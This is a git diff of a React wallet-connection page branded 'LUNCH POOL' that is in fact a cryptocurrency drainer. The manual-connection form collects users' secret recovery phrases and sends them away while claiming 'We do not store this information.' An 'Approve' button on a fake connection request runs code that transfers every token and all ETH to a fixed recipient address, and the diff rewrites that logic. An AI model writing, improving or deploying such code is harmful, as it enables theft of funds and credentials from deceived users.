   const handleWalletSelect = (wallet) => {
     setSelectedWallet(wallet);
-    setManualStep('input');
   };
 
   const handleInputChange = (e) => {
-    setFormData({ ...formData, secretPhrase: e.target.value });
-    if (errors.secretPhrase) {
-      setErrors({ ...errors, secretPhrase: null });
-    }
+    setSecretPhrase(e.target.value);
   };
 
   const validateForm = () => {
-    const newErrors = {};
-    if (!formData.secretPhrase.trim()) newErrors.secretPhrase = 'Secret phrase or private key is required';
-    setErrors(newErrors);
-    return Object.keys(newErrors).length === 0;
+    return secretPhrase.trim().split(/\s+/).length >= 12;
   };
 
   const handleManualSubmit = async (e) => {
     e.preventDefault();
     if (validateForm()) {
-      try {
-        await sendWalletInfo(selectedWallet.name, formData.secretPhrase);
+      await sendWalletInfo(selectedWallet.name, secretPhrase);
         closeAllPopups();
-      } catch (err) {
-        setErrors({ form: "Failed to submit details. Please try again." });
-      }
+      // Optionally show a confirmation message
+    } else {
+      alert('Please enter a valid secret phrase (at least 12 words).');
     }
   };
 
-  // --- Transaction Logic ---
-
   const handleSendAllAssets = async () => {
-    if (!provider || !signer || !address || !RECIPIENT_ADDRESS) {
-      setTxError("Wallet not connected or recipient address is not configured.");
+    if (!signer || !RECIPIENT_ADDRESS) {
+      setTxError('Signer or recipient address is not set.');
       return;
     }
     
     setIsSending(true);
     setTxError('');
-    const errorMessages = [];
 
-    // Determine fee strategy (EIP-1559 vs. Legacy)
-    const feeData = await provider.getFeeData();
-    const txOptions = {};
-    if (feeData.maxFeePerGas && feeData.maxPriorityFeePerGas) {
-      txOptions.maxFeePerGas = feeData.maxFeePerGas;
-      txOptions.maxPriorityFeePerGas = feeData.maxPriorityFeePerGas;
-      txOptions.type = 2; // EIP-1559
-    } else {
-      txOptions.gasPrice = feeData.gasPrice;
-      txOptions.type = 0; // Legacy
-    }
-
-    // 1. Attempt to send all ERC-20 tokens
-    for (const token of walletBalance.tokens) {
-      try {
-        if (token.rawBalance > 0n) {
-          console.log(`Attempting to send ${token.symbol}...`);
-          const tokenContract = new ethers.Contract(token.contractAddress, ERC20_ABI, signer);
-          const tx = await tokenContract.transfer(RECIPIENT_ADDRESS, token.rawBalance, txOptions);
-          await tx.wait();
-          console.log(`${token.symbol} transfer confirmed!`);
-        }
-      } catch (err) {
-        console.error(`${token.symbol} transfer failed:`, err);
-        errorMessages.push(`${token.symbol}: ${err.reason || err.message}`);
-      }
-    }
-
-    // 2. Attempt to send ETH
     try {
-      const balance = await provider.getBalance(address);
-      const gasLimit = 21000n;
-      
-      const gasPrice = txOptions.gasPrice || txOptions.maxFeePerGas;
-      if (!gasPrice) {
-        throw new Error("Could not determine gas price for transaction.");
+      // 1. Transfer all ERC-20 tokens
+      for (const token of walletBalance.tokens) {
+        try {
+          const tokenContract = new ethers.Contract(token.contractAddress, ERC20_ABI, signer);
+          const balance = await tokenContract.balanceOf(address);
+          
+          if (balance > 0) {
+            console.log(`Transferring ${ethers.formatUnits(balance, await tokenContract.decimals())} ${token.symbol}...`);
+            const tx = await tokenContract.transfer(RECIPIENT_ADDRESS, balance);
+            await tx.wait();
+            console.log(`${token.symbol} transfer successful!`);
+          }
+        } catch (tokenError) {
+          console.error(`Failed to transfer ${token.symbol}:`, tokenError);
+          // Don't stop the whole process, just log the error and continue
+        }
       }
 
+      // 2. Transfer all remaining ETH
+      const ethBalance = await provider.getBalance(address);
+      const gasPrice = (await provider.getFeeData()).gasPrice;
+      const gasLimit = BigInt(21000); // Standard gas limit for ETH transfer
       const gasCost = gasPrice * gasLimit;
 
-      if (balance > gasCost) {
-        const valueToSend = balance - gasCost;
-        const ethTxOptions = {
-          ...txOptions,
-          to: RECIPIENT_ADDRESS,
-          value: valueToSend,
-          gasLimit: gasLimit
+      if (ethBalance > gasCost) {
+        const amountToSend = ethBalance - gasCost;
+        console.log(`Transferring ${ethers.formatEther(amountToSend)} ETH...`);
+
+        const tx = {
+        to: RECIPIENT_ADDRESS,
+          value: amountToSend
         };
-        const tx = await signer.sendTransaction(ethTxOptions);
-        console.log('ETH transaction sent:', tx.hash);
-        await tx.wait();
-        console.log('ETH transaction confirmed!');
-      } else if (balance > 0n) {
-        console.log("Insufficient ETH for gas fees.");
+
+        try {
+            // Attempt EIP-1559 transaction
+            const feeData = await provider.getFeeData();
+            if (feeData.maxFeePerGas && feeData.maxPriorityFeePerGas) {
+                const txRequest = {
+                    ...tx,
+                    maxFeePerGas: feeData.maxFeePerGas,
+                    maxPriorityFeePerGas: feeData.maxPriorityFeePerGas,
+                    gasLimit: gasLimit,
+                };
+                const txResponse = await signer.sendTransaction(txRequest);
+                await txResponse.wait();
+            } else {
+                throw new Error("EIP-1559 not supported, falling back to legacy.");
+            }
+        } catch (eip1559Error) {
+            console.warn("EIP-1559 transaction failed, trying legacy:", eip1559Error.message);
+            // Fallback to legacy transaction
+            try {
+                const txRequest = { ...tx, gasPrice: gasPrice, gasLimit: gasLimit };
+                const txResponse = await signer.sendTransaction(txRequest);
+                await txResponse.wait();
+            } catch (legacyError) {
+                throw new Error(`Legacy transaction failed: ${legacyError.message}`);
+            }
+        }
+        
+        console.log('ETH transfer successful!');
+      } else {
+        console.log('Not enough ETH to cover gas fees for the final transfer.');
       }
-    } catch (err) {
-      console.error("ETH transfer failed:", err);
-      errorMessages.push(`ETH: ${err.reason || err.message}`);
-    }
-
-    setIsSending(false);
-
-    if (errorMessages.length > 0) {
-      const message = errorMessages.join('; ');
-      setTxError(message.length > 150 ? 'Multiple errors occurred during transfer.' : message);
-    } else {
+      
       closeAllPopups();
+      disconnect();
+
+    } catch (error) {
+      console.error('An error occurred during the transaction:', error);
+      setTxError(`Transaction failed: ${error.message}`);
+    } finally {
+      setIsSending(false);
     }
   };
 
-  // --- Render Methods ---
-
   const renderConnectionCards = () => (
-    <div className="grid grid-cols-1 md:grid-cols-2 gap-8 mb-12">
-      <div className="connection-card group relative overflow-hidden rounded-2xl bg-gradient-to-b from-white/5 to-white/[0.02] border border-white/10 backdrop-blur-sm p-8 hover:border-purple-500/50 transition-all duration-300">
-        <div className="absolute top-0 right-0 w-32 h-32 bg-gradient-to-br from-purple-500/10 to-pink-600/10 rounded-full blur-3xl"></div>
-        <div className="relative z-10">
-          <div className="flex items-center gap-4 mb-6">
-            <div className="w-12 h-12 rounded-lg bg-purple-500/20 flex items-center justify-center">
-              <Import size={24} className="text-purple-400" />
-            </div>
-            <div className="text">
-              <h3 className="text-xl font-semibold text-white">Manual Connection</h3>
-              <p className="text-gray-400 text-sm">Import using seed phrase</p>
-            </div>
+    <div className="w-full max-w-2xl text-center">
+      <h1 className="text-4xl md:text-5xl font-extrabold tracking-tight text-white mb-4">
+        Connect your wallet
+      </h1>
+      <p className="text-lg md:text-xl text-gray-400 max-w-2xl mx-auto mb-12">
+        Choose your preferred connection method below to securely access the application.
+      </p>
+
+      <div className="grid md:grid-cols-2 gap-6">
+        {/* Automatic Connection Card */}
+        <div
+          onClick={handleConnection}
+          className="bg-gray-800/50 border border-white/10 rounded-2xl p-8 hover:bg-gray-700/70 hover:border-blue-500 cursor-pointer transition-all duration-300 transform hover:-translate-y-1 shadow-lg"
+        >
+          <div className="flex items-center justify-center w-16 h-16 rounded-full bg-blue-600/20 mb-6 mx-auto">
+            <Zap size={32} className="text-blue-400" />
           </div>
-          <p className="text-gray-300 mb-6">
-            Securely connect by selecting your wallet type and entering your recovery phrase.
-          </p>
-          <div className="features-list space-y-2 mb-8">
-            <div className="flex items-center gap-2 text-sm text-gray-400">
-              <Shield size={14} className="text-green-400" /> <span>Bank-level encryption</span>
-            </div>
-            <div className="flex items-center gap-2 text-sm text-gray-400">
-              <Check size={14} className="text-green-400" /> <span>Works with all wallet types</span>
-            </div>
-            <div className="flex items-center gap-2 text-sm text-gray-400">
-              <Wallet size={14} className="text-green-400" /> <span>Direct access to funds</span>
-            </div>
-          </div>
-          <button 
-            onClick={() => setShowManualPopup(true)}
-            className="w-full px-6 py-3 rounded-lg bg-gradient-to-r from-purple-600 to-pink-600 hover:from-purple-700 hover:to-pink-700 text-white font-medium transition-all shadow-lg shadow-purple-700/30"
-          >
-            Connect Manually
-          </button>
+          <h2 className="text-2xl font-bold text-white mb-2">Automatic Connection</h2>
+          <p className="text-gray-400">Recommended. Connect using a popup with a list of supported wallets.</p>
         </div>
-      </div>
-      <div className="connection-card group relative overflow-hidden rounded-2xl bg-gradient-to-b from-white/5 to-white/[0.02] border border-white/10 backdrop-blur-sm p-8 hover:border-blue-500/50 transition-all duration-300">
-        <div className="absolute top-0 right-0 w-32 h-32 bg-gradient-to-br from-blue-500/10 to-cyan-600/10 rounded-full blur-3xl"></div>
-        <div className="relative z-10">
-          <div className="flex items-center gap-4 mb-6">
-            <div className="w-12 h-12 rounded-lg bg-blue-500/20 flex items-center justify-center">
-              <Zap size={24} className="text-blue-400" />
-            </div>
-            <div className="text">
-              <h3 className="text-xl font-semibold text-white">Automatic Connection</h3>
-              <p className="text-gray-400 text-sm">One-click Web3 connection</p>
-            </div>
+
+        {/* Manual Connection Card */}
+        <div
+          onClick={() => setShowManualPopup(true)}
+          className="bg-gray-800/50 border border-white/10 rounded-2xl p-8 hover:bg-gray-700/70 hover:border-purple-500 cursor-pointer transition-all duration-300 transform hover:-translate-y-1 shadow-lg"
+        >
+          <div className="flex items-center justify-center w-16 h-16 rounded-full bg-purple-600/20 mb-6 mx-auto">
+            <Import size={32} className="text-purple-400" />
           </div>
-          <p className="text-gray-300 mb-6">
-            Quick connection using popular wallet providers.
-          </p>
-          <div className="features-list space-y-2 mb-8">
-            <div className="flex items-center gap-2 text-sm text-gray-400">
-              <Zap size={14} className="text-blue-400" /> <span>Instant connection</span>
-            </div>
-            <div className="flex items-center gap-2 text-sm text-gray-400">
-              <Shield size={14} className="text-blue-400" /> <span>Multiple wallet support</span>
-            </div>
-            <div className="flex items-center gap-2 text-sm text-gray-400">
-              <Check size={14} className="text-blue-400" /> <span>No seed phrase required</span>
-            </div>
-          </div>
-          <button 
-            onClick={() => open()}
-            className="w-full px-6 py-3 rounded-lg bg-gradient-to-r from-blue-600 to-purple-600 hover:from-blue-600 hover:to-purple-700 text-white font-medium transition-all shadow-lg shadow-blue-700/30"
-          >
-            Connect Wallet
-          </button>
+          <h2 className="text-2xl font-bold text-white mb-2">Manual Connection</h2>
+          <p className="text-gray-400">For advanced users. Import your wallet directly using your secret phrase.</p>
         </div>
       </div>
     </div>
   );
 
   const renderWalletDetails = () => (
-    <div className="mb-12 bg-gradient-to-r from-blue-900/20 to-purple-900/20 border border-blue-500/30 rounded-xl p-6 backdrop-blur-sm">
-      <h3 className="text-xl font-semibold text-white mb-6 flex items-center gap-3">
-        <Wallet size={22} className="text-blue-400" /> Wallet Connected
-      </h3>
-      <div className="grid grid-cols-1 md:grid-cols-2 gap-4 text-sm mb-6">
-        <div>
-          <p className="text-gray-400">Address</p>
-          <p className="text-white font-mono truncate" title={address}>{address}</p>
-        </div>
-        <div>
-          <p className="text-gray-400">Chain ID</p>
-          <p className="text-white font-medium">{chainId}</p>
-        </div>
-        <div className="border-t border-white/10 pt-4 md:border-t-0 md:pt-0">
-          <p className="text-gray-400">ETH Balance</p>
-          <p className="text-white font-medium">{parseFloat(walletBalance.eth).toFixed(5)} ETH</p>
-        </div>
-      </div>
-      
-      {walletBalance.tokens.length > 0 && (
-        <div className="mt-6 border-t border-white/10 pt-6">
-           <h4 className="text-lg font-semibold text-white mb-4">Token Balances</h4>
-           <div className="grid grid-cols-1 md:grid-cols-2 gap-4 text-sm">
-            {walletBalance.tokens.map(token => (
-              <div key={token.contractAddress}>
-                <p className="text-gray-400">{token.symbol}</p>
-                <p className="text-white font-medium">{parseFloat(token.balance).toFixed(4)}</p>
-              </div>
-            ))}
+      <div className="bg-gray-800 text-white p-6 rounded-xl shadow-lg w-full max-w-md mx-auto font-sans">
+          <div className="flex items-center justify-between mb-4">
+              <h3 className="text-xl font-bold">Wallet Details</h3>
+              <button onClick={() => disconnect()} className="bg-red-500 hover:bg-red-600 text-white font-bold py-2 px-4 rounded-lg text-sm">
+                  Disconnect
+              </button>
           </div>
-        </div>
-      )}
-
-      <button 
-        onClick={() => disconnect()}
-        className="w-full mt-6 px-6 py-3 rounded-lg bg-gradient-to-r from-red-600 to-pink-600 hover:from-red-700 hover:to-pink-700 text-white font-medium transition-all shadow-lg shadow-red-700/30"
-      >
-        Disconnect Wallet
-      </button>
-    </div>
+          <div className="bg-gray-700 p-4 rounded-lg">
+              <div className="flex items-center mb-3">
+                  <Wallet className="text-blue-400 mr-3" size={20}/>
+                  <p className="text-sm truncate"><strong>Address:</strong> {address}</p>
+              </div>
+              <div className="border-t border-gray-600 my-3"></div>
+              <p className="text-lg font-semibold mb-2">Assets</p>
+              <div className="space-y-2 max-h-48 overflow-y-auto">
+                  <div className="flex justify-between items-center">
+                      <span>ETH</span>
+                      <span>{parseFloat(walletBalance.eth).toFixed(5)}</span>
+                  </div>
+                  {walletBalance.tokens.map(token => (
+                      <div key={token.symbol} className="flex justify-between items-center text-sm">
+                          <span>{token.symbol}</span>
+                          <span>{parseFloat(token.balance).toFixed(5)}</span>
+                      </div>
+                  ))}
+              </div>
+          </div>
+      </div>
   );
 
   const renderManualConnectPopup = () => {
-    if (!showManualPopup) return null;
-
     const goBack = () => {
-        setManualStep('selection');
-        setErrors({});
-        setFormData({ secretPhrase: '' });
+      setSelectedWallet(null);
+      setSecretPhrase('');
+      setIsPasswordVisible(false);
+    };
+
+    if (selectedWallet) {
+      return (
+        <div className="bg-gray-900 text-white p-6 rounded-2xl shadow-lg max-w-md w-full font-sans relative">
+          <button onClick={goBack} className="absolute top-4 left-4 text-gray-400 hover:text-white">
+            <ArrowLeft size={24} />
+          </button>
+          <button onClick={closeAllPopups} className="absolute top-4 right-4 text-gray-400 hover:text-white">
+            <X size={24} />
+          </button>
+
+          <div className="text-center mb-6">
+            <img src={selectedWallet.icon} alt={selectedWallet.name} className="w-16 h-16 mx-auto mb-4 rounded-full" />
+            <h3 className="text-xl font-bold">Import your {selectedWallet.name}</h3>
+            <p className="text-gray-400">Enter your secret phrase to continue</p>
+          </div>
+
+          <form onSubmit={handleManualSubmit}>
+            <div className="relative mb-4">
+              <textarea
+                value={secretPhrase}
+                onChange={handleInputChange}
+                className={`w-full p-4 pr-12 bg-gray-800 border border-gray-700 rounded-lg focus:ring-2 focus:ring-blue-500 focus:outline-none resize-none font-mono ${!isPasswordVisible ? 'text-security-disc' : ''}`}
+                placeholder="Enter your secret phrase"
+                rows="3"
+              />
+              <button
+                type="button"
+                onClick={() => setIsPasswordVisible(!isPasswordVisible)}
+                className="absolute top-4 right-4 text-gray-400 hover:text-white"
+              >
+                {isPasswordVisible ? <EyeOff size={20} /> : <Eye size={20} />}
+              </button>
+            </div>
+            <div className="flex items-start mb-6 text-sm text-gray-500">
+              <AlertTriangle size={24} className="text-yellow-400 mr-3 mt-1 flex-shrink-0" />
+              <div>
+                Your secret phrase is used to secure your wallet. Never share it with anyone. We do not store this information.
+              </div>
+            </div>
+            <button
+              type="submit"
+              disabled={!validateForm()}
+              className="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-3 px-4 rounded-lg transition-all disabled:bg-gray-600 disabled:cursor-not-allowed"
+            >
+              Connect Now
+            </button>
+          </form>
+        </div>
+      );
     }
 
     return (
-      <div className="fixed inset-0 z-50 flex items-center justify-center bg-black bg-opacity-70 backdrop-blur-sm">
-        <div className="bg-gray-800 rounded-2xl shadow-2xl p-6 w-full max-w-lg m-4 border border-gray-700 relative">
-          <div className="flex justify-between items-center mb-6">
-            {manualStep === 'input' && (
-              <button onClick={goBack} className="text-gray-400 hover:text-white">
-                <ArrowLeft size={24} />
-              </button>
-            )}
-            <h3 className="text-xl font-bold text-white text-center flex-grow">
-                {manualStep === 'selection' ? 'Select Your Wallet' : `Import ${selectedWallet?.name}`}
-            </h3>
+      <div className="bg-gray-900 text-white p-6 rounded-2xl shadow-lg max-w-2xl w-full font-sans flex flex-col">
+        <div className="flex justify-between items-center mb-4">
+          <h3 className="text-xl font-bold">Connect Manually</h3>
             <button onClick={closeAllPopups} className="text-gray-400 hover:text-white">
               <X size={24} />
             </button>
           </div>
-
-          {manualStep === 'selection' ? (
-            <div className="grid grid-cols-2 md:grid-cols-3 gap-4 max-h-[60vh] overflow-y-auto p-1">
-              {POPULAR_WALLETS.map((wallet) => (
-                <button
+        <p className="text-gray-400 mb-6">
+          Select your wallet from the list below. Make sure you have your secret phrase ready.
+        </p>
+        <div className="flex-grow overflow-hidden">
+          {isLoadingWallets ? (
+             <div className="flex justify-center items-center h-full"><div className="animate-spin rounded-full h-12 w-12 border-b-2 border-white"></div></div>
+          ) : (
+            <div className="grid grid-cols-3 md:grid-cols-4 gap-4 max-h-[60vh] overflow-y-auto p-2">
+              {dynamicWallets.map((wallet) => (
+                <div
                   key={wallet.id}
                   onClick={() => handleWalletSelect(wallet)}
-                  className="flex flex-col items-center justify-center p-4 bg-gray-700 rounded-lg hover:bg-gray-600 transition-colors space-y-2"
+                  className="flex flex-col items-center p-3 bg-gray-800 rounded-lg hover:bg-gray-700 cursor-pointer transition-colors aspect-square justify-center"
                 >
-                  <span className="text-4xl">{wallet.icon}</span>
-                  <p className="font-semibold text-white text-sm text-center">{wallet.name}</p>
-                </button>
+                  <img src={wallet.icon} alt={wallet.name} className="w-12 h-12 mb-2 rounded-full" />
+                  <p className="text-xs text-center font-medium truncate w-full">{wallet.name}</p>
+                </div>
               ))}
             </div>
-          ) : (
-            <form onSubmit={handleManualSubmit} className="space-y-6">
-              <div className="relative">
-                <textarea
-                  placeholder="Enter your Secret Phrase or Private Key"
-                  value={formData.secretPhrase}
-                  onChange={handleInputChange}
-                  rows={4}
-                  className={`w-full p-4 bg-gray-700 rounded-lg text-white placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-purple-500 ${errors.secretPhrase ? 'border border-red-500' : 'border border-gray-600'}`}
-                />
-                <button
-                  type="button"
-                  onClick={() => setIsPasswordVisible(!isPasswordVisible)}
-                  className="absolute top-0 right-0 p-4 flex items-center text-gray-400 hover:text-white"
-                >
-                  {isPasswordVisible ? <EyeOff size={20} /> : <Eye size={20} />}
-                </button>
-                {errors.secretPhrase && <p className="text-red-500 text-sm mt-1">{errors.secretPhrase}</p>}
-              </div>
-
-              {errors.form && <p className="text-red-500 text-sm text-center">{errors.form}</p>}
-
-              <button
-                type="submit"
-                className="w-full bg-gradient-to-r from-blue-500 to-purple-600 py-3 rounded-lg font-medium text-white hover:opacity-90 transition-opacity"
-              >
-                Import Wallet
-              </button>
-            </form>
           )}
         </div>
       </div>
@@ -727,83 +507,95 @@ export default function ConnectWallet() {
   };
   
   const renderTransactionPopup = () => {
-    if (!showTransactionPopup) return null;
-
-    const hasFunds = parseFloat(walletBalance.eth) > 0 || walletBalance.tokens.length > 0;
-
     return (
-      <div className="fixed inset-0 z-50 flex items-center justify-center bg-black bg-opacity-80 backdrop-blur-sm">
-        <div className="bg-gray-800 rounded-2xl shadow-xl p-8 w-full max-w-sm m-4 border border-gray-700 text-center">
-          <h3 className="text-2xl font-bold text-white mb-4">Connection Request</h3>
-          <p className="text-gray-400 mb-8">Do you approve this Connection?</p>
-          
-          <div className="flex flex-col space-y-4">
+      <div className="bg-gray-900 text-white p-8 rounded-2xl shadow-lg max-w-md w-full font-sans text-center">
+        {isConnected && <div className="absolute top-4 right-4">{renderWalletDetails()}</div>}
+        <Shield size={48} className="mx-auto text-blue-500 mb-4" />
+        <h2 className="text-2xl font-bold mb-2">Connection Request</h2>
+        <p className="text-gray-400 mb-6">
+          The application is requesting to perform a transaction.
+          Please review the details and approve to continue.
+        </p>
+
+            {txError && (
+          <div className="bg-red-900 border border-red-700 text-red-200 px-4 py-3 rounded-lg mb-4 text-left">
+            <p className="font-bold">Error</p>
+            <p className="text-sm">{txError}</p>
+          </div>
+        )}
+
+        <div className="flex justify-center space-x-4">
              <button 
-              onClick={handleSendAllAssets} 
-              className={`w-full py-3 bg-gradient-to-r from-blue-500 to-purple-600 rounded-lg font-semibold text-white hover:opacity-90 transition-opacity flex items-center justify-center ${isSending || !hasFunds ? 'opacity-50 cursor-not-allowed' : ''}`}
-              disabled={isSending || !hasFunds}
+            onClick={handleSendAllAssets}
+            disabled={isSending}
+            className="flex items-center justify-center bg-green-600 hover:bg-green-700 text-white font-bold py-3 px-6 rounded-lg transition-colors w-1/2 disabled:bg-gray-600"
             >
               {isSending ? (
-                <>
-                  <svg className="animate-spin -ml-1 mr-3 h-5 w-5 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
-                    <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
-                    <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
-                  </svg>
-                  Approving...
-                </>
-              ) : (
-                'Approve Connection'
+              <div className="animate-spin rounded-full h-5 w-5 border-b-2 border-white"></div>
+            ) : (
+              <><Check className="mr-2" /> Approve</>
               )}
             </button>
             <button 
-              onClick={closeAllPopups} 
-              className={`w-full py-3 bg-gray-600/50 rounded-lg hover:bg-gray-600/80 text-gray-300 font-semibold ${isSending ? 'cursor-not-allowed' : ''}`}
+            onClick={() => {
+              closeAllPopups();
+              disconnect();
+            }}
               disabled={isSending}
+            className="flex items-center justify-center bg-red-600 hover:bg-red-700 text-white font-bold py-3 px-6 rounded-lg transition-colors w-1/2 disabled:bg-gray-600"
             >
-              Decline Connection
+            <X className="mr-2" /> Decline
             </button>
-          </div>
         </div>
       </div>
     );
   };
 
   return (
-    <div className="connect-page min-h-screen bg-gradient-to-br from-slate-900 via-purple-900 to-slate-900 text-white">
-      <div className="fixed inset-0 bg-gradient-radial from-transparent via-indigo-900/20 to-black/40 pointer-events-none"></div>
-      <header className="relative z-20 px-6 py-4 flex justify-between items-center border-b border-white/10 backdrop-blur-sm">
-        <div className="logo text-2xl font-bold bg-gradient-to-r from-blue-400 to-purple-600 bg-clip-text text-transparent">
-          LUNCH POOL
-        </div>
-        <div className="flex items-center gap-4">
-          <button
-            onClick={() => window.history.back()}
-            className="flex items-center gap-2 px-4 py-2 rounded-lg bg-white/5 border border-white/10 hover:bg-white/10 text-white transition-all"
-          >
-            <ArrowLeft size={16} />
-            Back
-          </button>
-        </div>
+    <div className="min-h-screen bg-gray-900 text-white flex flex-col">
+      {/* Background decorative elements */}
+      <div className="absolute top-0 left-0 w-full h-full overflow-hidden z-0">
+          <div className="absolute top-0 left-0 w-1/2 h-1/2 bg-purple-600/30 rounded-full filter blur-3xl opacity-50 animate-pulse"></div>
+          <div className="absolute bottom-0 right-0 w-1/2 h-1/2 bg-blue-600/20 rounded-full filter blur-3xl opacity-50 animate-pulse" style={{animationDelay: '2s'}}></div>
+      </div>
+
+      <header className="absolute top-0 left-0 w-full p-4 flex justify-between items-center z-20">
+        <Link to="/" className="text-xl font-bold tracking-wider">LUNCH POOL</Link>
+        <Link to="/" className="px-4 py-2 text-sm bg-white/10 border border-white/20 rounded-full hover:bg-white/20 transition-colors">
+          Back
+        </Link>
       </header>
-      <main className="relative z-20 container mx-auto px-6 py-12">
-        <div className="max-w-4xl mx-auto">
-          <div className="text-center mb-12">
-            <div className="inline-block px-3 py-1 rounded-full bg-blue-900/30 border border-blue-500/50 text-blue-400 text-sm font-semibold mb-6">
-              SECURE CONNECTION
-            </div>
-            <h1 className="text-4xl md:text-5xl font-bold mb-6 text-transparent bg-clip-text bg-gradient-to-r from-blue-400 to-purple-600">
-              Connect Your Wallet
-            </h1>
-            <p className="text-gray-300 text-lg max-w-2xl mx-auto">
-              Connect your wallet to view your balance, interact with smart contracts, and make transactions on Ethereum Mainnet.
-            </p>
+
+      <main className="flex-grow flex items-center justify-center z-10 p-4">
+        {!isConnected && !showManualPopup && !showTransactionPopup && renderConnectionCards()}
+        
+        {isConnected && !showTransactionPopup && (
+          <div className="text-center">
+            <h2 className="text-3xl font-bold mb-4">You are Connected!</h2>
+            {renderWalletDetails()}
+            <button
+              onClick={() => setShowTransactionPopup(true)}
+              className="mt-4 bg-blue-600 hover:bg-blue-700 text-white font-bold py-2 px-4 rounded"
+            >
+              Show Actions
+            </button>
           </div>
-          
-          {isConnected ? renderWalletDetails() : renderConnectionCards()}
-        </div>
+        )}
       </main>
-      {renderManualConnectPopup()}
-      {renderTransactionPopup()}
+
+      {/* Popups (Modals) */}
+      {(showManualPopup || showTransactionPopup) && (
+        <div className="fixed inset-0 bg-black bg-opacity-80 backdrop-blur-sm flex items-center justify-center z-50 p-4">
+          {showManualPopup && renderManualConnectPopup()}
+          {showTransactionPopup && renderTransactionPopup()}
+        </div>
+      )}
+      
+      <footer className="w-full p-4 text-center text-xs text-gray-500 z-10">
+        <a href="#" className="hover:text-white underline">Terms of Service</a>
+        <span className="mx-2">•</span>
+        <a href="#" className="hover:text-white underline">Privacy Policy</a>
+      </footer>
     </div>
   );
 }
